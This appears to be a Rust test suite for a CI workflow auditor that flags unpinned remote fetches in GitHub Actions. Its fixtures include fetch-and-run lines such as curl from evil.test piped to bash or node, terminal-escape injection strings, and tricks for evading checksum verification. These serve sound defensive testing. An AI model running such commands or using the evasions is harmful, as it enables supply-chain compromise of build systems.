mod common;

use predicates::prelude::*;

// ── Exit codes ──────────────────────────────────────────────────────────────

#[test]
fn clean_workflow_exits_zero() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success();
}

#[test]
fn run_shell_defaults_and_overrides_select_the_matching_scanner() {
    let content = "name: languages\non: push\ndefaults:\n  run:\n    shell: python\njobs:\n  python:\n    runs-on: ubuntu-latest\n    steps:\n      - run: requests.get('https://example.com/tool')\n  node:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: node {0}\n    steps:\n      - run: fetch('https://example.com/tool')\n      - shell: bash\n        run: curl https://example.com/tool | bash\n";
    let dir = common::repo_with_workflow("ci.yml", content);
    for command in ["audit", "score"] {
        let output = common::pinprick_cmd()
            .args(["--json", command])
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(output.status.code(), Some(1), "{command}");
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], true, "{command}");
        let findings = report["findings"].as_array().unwrap();
        assert_eq!(findings.len(), 3, "{command}: {report}");
        if command == "audit" {
            let mut lines: Vec<_> = findings
                .iter()
                .map(|finding| finding["line"].as_u64().unwrap())
                .collect();
            lines.sort_unstable();
            assert_eq!(lines, [10, 17, 19]);
        }
    }
}

#[test]
fn unknown_run_shell_reports_incomplete_coverage() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "name: unknown\non: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - shell: ruby {0}\n        run: puts 'hello'\n",
    );
    for command in ["audit", "score"] {
        let output = common::pinprick_cmd()
            .args(["--json", command])
            .arg(dir.path())
            .output()
            .unwrap();
        if command == "audit" {
            assert_eq!(output.status.code(), Some(2));
        }
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], false, "{command}");
    }
}

#[test]
fn equals_heavy_action_source_preserves_collected_findings() {
    for (source, command) in [("index.js", "node"), ("index.py", "python")] {
        let dir = common::repo_with_workflow(
            "ci.yml",
            "name: scan\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.com/tool | bash\n      - uses: ./action\n",
        );
        let action = dir.path().join("action");
        std::fs::create_dir(&action).unwrap();
        std::fs::write(
            action.join("action.yml"),
            format!(
                "name: test\ndescription: test\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: {command} \"$GITHUB_ACTION_PATH/{source}\"\n"
            ),
        )
        .unwrap();
        std::fs::write(
            action.join(source),
            format!("note = \"{}\"\n", "a=".repeat(100_000)),
        )
        .unwrap();
        let output = common::pinprick_cmd()
            .args(["--json", "audit", "--no-audited-catalog"])
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(output.status.code(), Some(1), "{source}");
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["coverage_complete"], true, "{source}");
        let findings = report["findings"].as_array().unwrap();
        assert_eq!(findings.len(), 1, "{source}");
        assert_eq!(findings[0]["severity"], "high", "{source}");
    }
}

#[test]
fn unparseably_deep_javascript_is_incomplete_and_keeps_collected_findings() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "name: scan\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.com/tool | bash\n      - uses: ./action\n",
    );
    let action = dir.path().join("action");
    std::fs::create_dir(&action).unwrap();
    std::fs::write(
        action.join("action.yml"),
        "name: test\ndescription: test\nruns:\n  using: node20\n  main: index.js\n",
    )
    .unwrap();
    std::fs::write(
        action.join("index.js"),
        format!(
            "const root = __dirname;\nconst nested = {}{};\n",
            "[".repeat(200_000),
            "]".repeat(200_000)
        ),
    )
    .unwrap();
    let output = common::pinprick_cmd()
        .args(["--json", "audit", "--no-audited-catalog"])
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(2));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage_complete"], false);
    let findings = report["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
}

#[test]
fn clean_workflow_human_output() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("No runtime fetch risks found."));
}

#[test]
fn self_repository_root_action_is_scanned() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "\
name: local root
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: $/
",
    );
    std::fs::write(
        dir.path().join("action.yml"),
        "\
name: local root
description: root action
runs:
  using: composite
  steps:
    - shell: bash
      run: curl -fsSL https://example.com/install.sh | bash
",
    )
    .unwrap();

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["actions_scanned"], 1);
    assert_eq!(report["coverage_complete"], true);
    let findings = report["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["action"], "$/");
    assert_eq!(findings[0]["workflow_file"], ".github/workflows/ci.yml");
}

#[test]
fn local_reusable_workflow_call_does_not_break_coverage() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "\
name: caller
on: pull_request
jobs:
  commits:
    uses: $/.github/workflows/reusable-commits.yml
",
    );
    std::fs::write(
        dir.path().join(".github/workflows/reusable-commits.yml"),
        "\
name: reusable commits
on:
  workflow_call:
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
",
    )
    .unwrap();

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(0));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage_complete"], true);
    assert!(report["findings"].as_array().unwrap().is_empty());
}

#[test]
fn yaml_suffixed_local_action_directory_is_still_scanned() {
    let dir = common::repo_with_workflow(
        "ci.yml",
        "\
name: caller
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/check.yml
",
    );
    let action_dir = dir.path().join(".github/actions/check.yml");
    std::fs::create_dir_all(&action_dir).unwrap();
    std::fs::write(
        action_dir.join("action.yml"),
        "\
name: check
description: an action directory named like a workflow file
runs:
  using: composite
  steps:
    - shell: bash
      run: curl -fsSL https://example.com/install.sh | bash
",
    )
    .unwrap();

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["actions_scanned"], 1);
    assert_eq!(report["coverage_complete"], true);
    assert_eq!(report["findings"].as_array().unwrap().len(), 1);
    assert_eq!(output.status.code(), Some(1));
}

#[test]
fn anchored_steps_do_not_hide_a_local_action() {
    // YAML node properties put step context out of reach of a line scanner, so
    // classification must not depend on recognizing `steps:` at all.
    let dir = common::repo_with_workflow(
        "ci.yml",
        "\
name: caller
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps: &audit_steps
      - uses: ./.github/actions/check.yml
  rerun:
    runs-on: ubuntu-latest
    steps: *audit_steps
",
    );
    let action_dir = dir.path().join(".github/actions/check.yml");
    std::fs::create_dir_all(&action_dir).unwrap();
    std::fs::write(
        action_dir.join("action.yml"),
        "\
name: check
description: an action directory named like a workflow file
runs:
  using: composite
  steps:
    - shell: bash
      run: curl -fsSL https://example.com/install.sh | bash
",
    )
    .unwrap();

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["actions_scanned"], 1);
    assert_eq!(report["coverage_complete"], true);
    assert_eq!(report["findings"].as_array().unwrap().len(), 1);
    assert_eq!(output.status.code(), Some(1));
}

#[test]
fn bundled_parent_audit_does_not_cover_action_subpaths() {
    let workflow = "\
name: cache
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
      - uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
";
    let dir = common::repo_with_workflow("ci.yml", workflow);

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(2));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["rules_version"], 9);
    assert_eq!(report["audited_bundled"], 0);
    assert_eq!(report["external_actions_skipped"], 2);
    assert_eq!(report["coverage_complete"], false);
}

#[test]
fn no_audited_catalog_bypasses_bundled_verdict() {
    let workflow = "\
name: cache
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    for bypass in [false, true] {
        let mut command = common::pinprick_cmd();
        command.arg("--json").arg("audit").arg(dir.path());
        if bypass {
            command.arg("--no-audited-catalog");
        }
        let output = command.output().unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(output.status.code(), Some(if bypass { 2 } else { 0 }));
        assert_eq!(report["audited_bundled"], usize::from(!bypass));
        assert_eq!(report["external_actions_skipped"], usize::from(bypass));
        assert_eq!(report["coverage_complete"], !bypass);
    }
}

#[test]
fn uses_hidden_by_block_scalars_or_key_properties_stays_in_coverage() {
    let folded_name = "\
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: >
          Check out
        uses: evil/action@main
";
    let tagged_key = "\
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - !!str uses: evil/action@main
";
    for (workflow, skipped, failure) in [
        (folded_name, 1, "external action was skipped"),
        (
            tagged_key,
            0,
            ":6: unsupported uses target `evil/action@main`",
        ),
    ] {
        let dir = common::repo_with_workflow("ci.yml", workflow);
        let output = common::pinprick_cmd()
            .arg("--json")
            .arg("audit")
            .arg(dir.path())
            .output()
            .unwrap();
        assert_eq!(output.status.code(), Some(2), "{workflow}");
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["external_actions_skipped"], skipped, "{workflow}");
        assert_eq!(report["coverage_complete"], false, "{workflow}");
        assert!(
            report["coverage_failures"]
                .as_array()
                .unwrap()
                .iter()
                .any(|entry| entry.as_str().unwrap().contains(failure)),
            "{workflow}: {}",
            report["coverage_failures"]
        );
    }
}

#[test]
fn human_output_sanitizes_terminal_escapes() {
    // A matched run-block line carrying an ANSI escape must not reach the
    // terminal verbatim — otherwise a hostile action could spoof or hide a
    // finding in the operator's terminal. The escape is delivered via a
    // double-quoted YAML scalar (`\x1b`), which stays valid YAML and is
    // decoded to a real ESC byte by the run-block parser.
    let workflow = "\
name: evil
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: \"curl -fsSL https://evil.test/install.sh | bash # \\x1b[2Jx\"
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    // The finding is still reported (the host text survives sanitization)…
    assert!(stdout.contains("evil.test"), "finding missing: {stdout:?}");
    // …but the raw ESC byte from the source line never reaches the terminal.
    assert!(
        !stdout.contains('\u{1b}'),
        "raw ESC leaked into terminal output: {stdout:?}"
    );
}

#[test]
fn human_output_sanitizes_escapes_in_finding_description() {
    let workflow = "\
name: evil
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: \"docker run alpine\\x1b[2J\\x1b[31mSPOOFED\"
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("unpinned image"));
    assert!(
        !stdout.contains('\u{1b}'),
        "raw ESC leaked through finding description: {stdout:?}"
    );
}

#[test]
fn pipe_to_shell_exits_one() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .code(1);
}

#[test]
fn pipe_to_shell_json_fields() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
    assert_eq!(findings[0]["category"], "shell_fetch");
    assert!(findings[0]["line"].is_number());
}

#[test]
fn parallel_run_block_is_scanned() {
    // A `curl | bash` nested inside a `parallel:` step group must be caught
    // end-to-end (run-block extraction recurses into parallel groups) and must
    // anchor to the real source line, not the `parallel:` container.
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PARALLEL_PIPE_TO_SHELL);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
    assert_eq!(findings[0]["category"], "shell_fetch");
    assert_eq!(findings[0]["line"], 12);
}

#[test]
fn curl_latest_finding() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CURL_LATEST);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
}

#[test]
fn versioned_url_is_clean() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_VERSIONED);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

#[test]
fn audit_flags_dangerous_url_after_versioned_decoy() {
    // A versioned decoy URL placed before the real unpinned fetch must not
    // suppress the finding — every URL on the line is checked, not just the first.
    let workflow = "\
name: decoy
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://cdn.example.com/v1.2.3/safe.txt https://evil.test/install.sh -o out
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "decoy bypass not caught: {json}");
    assert!(
        findings[0]["pattern_matched"]
            .as_str()
            .unwrap()
            .contains("evil.test")
    );
}

#[test]
fn audit_flags_bare_ip_fetch() {
    // A bare-IP host must not be read as a "versioned" URL and whitelisted.
    let workflow = "\
name: ip
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://10.0.0.1/install.sh -o out
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "bare-IP fetch not flagged: {json}");
}

#[test]
fn audit_flags_pipe_to_node() {
    // `curl | node` executes fetched JS — it must be HIGH pipe-to-shell, not
    // a checksum-downgradeable medium.
    let workflow = "\
name: pipe-node
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://evil.test/setup.js | node
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
}

#[test]
fn data_format_exempt() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_DATA_FORMAT);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

#[test]
fn checksum_suppressed() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CHECKSUM);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    // The fetch is verified by sha256sum on the next line, so it is suppressed
    // (recorded as an allowed match) rather than flagged — the run is clean.
    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

#[test]
fn runtime_sidecar_from_an_earlier_step_does_not_suppress() {
    let workflow = r#"
name: checksum
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o tool.sig https://example.com/v1.2.3/tool.sig
      - name: Verify payload
        shell: bash
        run: |
          curl -o tool https://example.com/tool
          gpg --verify tool.sig tool
"#;
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(
        findings[0]["pattern_matched"],
        "curl -o tool https://example.com/tool"
    );
    assert_eq!(json["coverage_complete"], true);
}

#[test]
fn runtime_sidecar_path_aliases_from_earlier_steps_do_not_suppress() {
    let workflow = r#"
name: checksum aliases
on: push
jobs:
  working-directory:
    runs-on: ubuntu-latest
    steps:
      - working-directory: .github/sigs
        run: curl -o tool.sig https://example.com/v1.2.3/tool.sig
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify .github/sigs/tool.sig tool
  rename:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o downloaded.sig https://example.com/v1.2.3/downloaded.sig
      - run: mv downloaded.sig trusted.sig
      - run: |
          curl -o payload https://example.com/payload
          gpg --verify trusted.sig payload
"#;
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let patterns: Vec<&str> = json["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|finding| finding["pattern_matched"].as_str())
        .collect();
    assert_eq!(patterns.len(), 2);
    assert!(patterns.iter().any(|pattern| pattern.contains("/tool")));
    assert!(patterns.iter().any(|pattern| pattern.contains("/payload")));
}

#[test]
fn inline_directory_changes_do_not_hide_cross_step_sidecars() {
    let workflow = r#"
name: checksum directories
on: push
jobs:
  same-line:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p dl && cd dl && curl -o x.sig https://example.com/v1.2.3/x.sig
      - run: |
          curl -o x https://example.com/x
          gpg --verify dl/x.sig x
  own-line:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p dl
          cd dl
          curl -o x.sig https://example.com/v1.2.3/x.sig
      - run: |
          curl -o x https://example.com/x
          gpg --verify dl/x.sig x
  subshell:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p dl && (cd dl && curl -o x.sig https://example.com/v1.2.3/x.sig)
      - run: |
          curl -o x https://example.com/x
          gpg --verify dl/x.sig x
  pushd:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p dl
          pushd dl
          curl -o x.sig https://example.com/v1.2.3/x.sig
          popd
      - run: |
          curl -o x https://example.com/x
          gpg --verify dl/x.sig x
"#;
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["findings"].as_array().unwrap().len(), 4);
    assert_eq!(json["coverage_complete"], true);
}

#[test]
fn expanded_verification_material_does_not_suppress() {
    let workflow = r#"
name: expanded verification material
on: push
jobs:
  signature:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o f.sig https://example.com/v1.2.3/f.sig
      - run: |
          curl -o f https://example.com/f
          gpg --verify "$PWD/f.sig" f
  key:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o key.asc https://example.com/v1.2.3/key.asc
          gpg --import "$PWD/key.asc"
      - run: |
          curl -o payload https://example.com/payload
          gpg --verify committed.sig payload
"#;
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["findings"].as_array().unwrap().len(), 2);
    assert_eq!(json["coverage_complete"], true);
}

#[test]
fn reviewed_path_binding_evasions_are_fail_closed() {
    let workflow = r#"
name: reviewed path binding evasions
on: push
jobs:
  shell-control:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p dl
          if cd dl; then curl -o tool.sig https://example.com/v1.2.3/tool.sig; fi
          cd ..
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify dl/tool.sig tool
  powershell-directory:
    runs-on: windows-latest
    steps:
      - shell: pwsh
        run: |
          Set-Location dl
          curl -o tool.sig https://example.com/v1.2.3/tool.sig
          Set-Location ..
      - shell: pwsh
        run: |
          curl -o tool https://example.com/tool
          gpg --verify dl/tool.sig tool
  process-substitution:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify <(curl https://example.com/v1.2.3/tool.sig) tool
  input-redirection:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o tool.sig https://example.com/v1.2.3/tool.sig
          curl -o tool https://example.com/tool
          gpg --verify /dev/stdin tool <tool.sig
  negated-verification:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o tool https://example.com/tool
          ! gpg --verify trusted.sig tool
  wrapped-key-import:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o key.asc https://example.com/v1.2.3/key.asc
          command gpg --import key.asc
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify trusted.sig tool
  directory-alias:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p dl
          curl -o dl/tool.sig https://example.com/v1.2.3/tool.sig
          ln -s dl alias
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify alias/tool.sig tool
  self-manifest:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o tool https://example.com/tool
          sha256sum -c tool
"#;
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let lines: Vec<u64> = json["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|finding| finding["line"].as_u64())
        .collect();
    assert_eq!(lines, vec![13, 25, 31, 38, 44, 53, 63, 69]);
    assert_eq!(json["coverage_complete"], true);
}

#[test]
fn absolute_directory_change_recovers_static_verification() {
    let digest = "a".repeat(64);
    let workflow = format!(
        r#"
name: absolute directory recovery
on: push
jobs:
  recovery:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cd "$RUNNER_TEMP"
          cd /tmp
          curl -o tool https://example.com/tool
          echo '{digest}  tool' | sha256sum -c -
"#
    );
    let dir = common::repo_with_workflow("ci.yml", &workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(0));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(json["findings"].as_array().unwrap().is_empty());
    assert_eq!(json["coverage_complete"], true);
}

#[test]
fn unrelated_checksum_does_not_suppress() {
    let workflow = "\
name: checksum
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -L https://example.com/install.sh -o tool.sh
          sha256sum unrelated.txt
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["findings"].as_array().unwrap().len(), 1);
}

#[test]
fn mid_token_checksum_flag_does_not_suppress() {
    let workflow = "\
name: checksum
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -L https://example.com/install.sh -o tool.sh
          sha256sum data-c tool.sh
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["findings"].as_array().unwrap().len(), 1);
}

#[test]
fn multiple_findings() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_MULTI_FINDINGS);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.len() >= 2,
        "expected at least 2 findings, got {}",
        findings.len()
    );

    // Findings should be sorted high-first.
    let severities: Vec<&str> = findings
        .iter()
        .map(|f| f["severity"].as_str().unwrap())
        .collect();
    for window in severities.windows(2) {
        let order = |s: &str| match s {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        };
        assert!(
            order(window[0]) <= order(window[1]),
            "findings not sorted by severity: {:?}",
            severities
        );
    }
}

#[test]
fn empty_workflow() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_EMPTY);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success();
}

#[test]
fn multiple_workflow_files() {
    let dir = common::repo_with_workflows(&[
        ("clean.yml", common::WORKFLOW_CLEAN),
        ("risky.yml", common::WORKFLOW_PIPE_TO_SHELL),
    ]);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
}

#[test]
fn audit_skips_unreadable_workflow_and_continues() {
    // A non-UTF-8 (or otherwise unreadable) workflow must not abort the scan of
    // the others — one bad file shouldn't take down a CI gate.
    let dir = tempfile::TempDir::new().unwrap();
    let wf = dir.path().join(".github").join("workflows");
    std::fs::create_dir_all(&wf).unwrap();
    // Sorts first; invalid UTF-8 bytes make read_to_string error.
    std::fs::write(wf.join("aaa-bad.yml"), [0xff, 0xfe, 0x00, 0x9f]).unwrap();
    // Sorts later; a real pipe-to-shell finding.
    std::fs::write(
        wf.join("zzz-good.yml"),
        "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://evil.test/i.sh | bash\n",
    )
    .unwrap();

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    // The readable file is still scanned, but unreadable input prevents a
    // complete verdict and therefore takes precedence over the finding exit.
    assert_eq!(
        output.status.code(),
        Some(2),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn unsupported_multiline_uses_exits_two() {
    for uses in [
        "uses:\n          actions/checkout@v4",
        "uses: >-\n          actions/checkout@v4",
    ] {
        let workflow = format!(
            "name: malformed\non: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - {uses}\n"
        );
        let dir = common::repo_with_workflow("ci.yml", &workflow);
        common::pinprick_cmd()
            .arg("audit")
            .arg(dir.path())
            .assert()
            .code(2)
            .stdout(predicate::str::contains("Coverage incomplete"));
    }
}

